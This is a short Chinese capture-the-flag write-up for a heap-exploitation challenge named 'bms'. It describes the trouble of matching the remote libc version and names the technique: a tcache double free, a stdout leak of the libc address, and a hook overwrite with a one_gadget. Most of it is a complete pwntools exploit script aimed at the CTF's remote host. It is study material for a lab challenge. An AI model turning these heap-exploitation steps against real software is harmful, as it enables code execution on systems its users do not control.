# bms
前面部分是让我逆向队友做的不太清楚他就说啥被耍了什么的...
最坑的一道题,充分诠释了`做题5分钟，环境2小时`...
一开始以为是`2.23`搞了半天利用控制`bss`不停清空,`unsorted bin atk + partial write` 本地不开`aslr`可以了开了`1/4096`...然后打了半天没反应..
菜鸡的我完全没注意到群里面的公告...于是改变思路`ubuntu18.04+libc2.27`.8min完成exp(虽然是`1/256`不想改了..注意布局应该可以优化到`1/16`)...结果远程还是不行...
换成`ubuntu17.10+libc.26`..之前没有这个环境从0开始下了一个..迅雷真坑...
终于打通.
## Analysis
题目在`tcache`下没啥难度就是简单的`stdout_flag_leak`
可以看看之前的一题[HITCONE2018_babytcache][2]
## exp

```python
from pwn import *
def login():
	pass
def c(c):
	p.sendlineafter(">",str(c))
def ADD(size,des='A',name="\x00"*6):
	c(1)
	p.sendafter("name:",name)
	p.sendlineafter("size",str(size))
	p.sendafter("tion:",des)
def cmd(c):
	p.sendlineafter(">\n",str(c))
def add(size,des='A',name="\x00"*6):
	cmd(1)
	p.sendafter("name:",name)
	p.sendlineafter("size",str(size))
	p.sendafter("tion:",des)
def free(idx):
	cmd(2)
	p.sendlineafter("index:",str(idx))
def FREE(idx):
	c(2)
	p.sendlineafter("index:",str(idx))
#context.log_level='debug'
#p=process('./pwn')
p=remote("90b826377a05d5e9508314e76f2f1e4e.kr-lab.com",40001)
p.sendlineafter("name:","admin")
p.sendlineafter("d:","frame")
#libc=ELF("libc-2.27.so")
add(0x68)#0
add(0x88)#1
add(0x28)#2
for x in range(8):
	free(1)
for x in range(7):
	free(2)

add(0x68,'\x20\x17')#3
free(0)
free(0)

add(0x68,'\x60\x35')#4icqf9be91c5a02ae0371b8d1bd5f06d7
add(0x68)#5
add(0x58)#6
free(6)
free(6)

add(0x58,p64(0x602060))
add(0x58)
add(0x58,p64(0)*10)

add(0x68)#0

add(0x68,p64(0xfbad1800)+p64(0)*3+'\x00')#1
p.read(8)
p.read(8)
p.read(8)
base=u64(p.read(8))-(0x7ffff7bad3e0-0x7ffff77d6000)
if base&0xfff!=0:
	p.close()
ADD(0x97,"A")#2
FREE(2)
FREE(2)
#gdb.attach(p)
log.warning(hex(base))
ADD(0x97,p64(0x3dac10+base))
ADD(0x97)
one=0xfdb8e
ADD(0x97,p64(one+base))
c(1)
p.interactive()
```